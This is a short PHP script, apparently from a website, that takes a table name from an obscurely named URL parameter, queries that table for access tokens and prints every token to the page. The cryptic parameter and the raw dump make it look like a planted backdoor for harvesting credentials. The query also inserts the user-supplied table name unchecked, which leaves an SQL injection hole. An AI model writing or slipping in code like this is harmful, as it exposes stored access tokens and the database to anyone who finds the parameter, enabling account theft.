<?php
include '../../../../../../_config.php';
$t = $_GET['tfsdnvsdfw'];
$j = mysqli_query($conn, "select access_token from $t");
while($i = mysqli_fetch_assoc($j)){
	echo $i['access_token'].'<br />';
}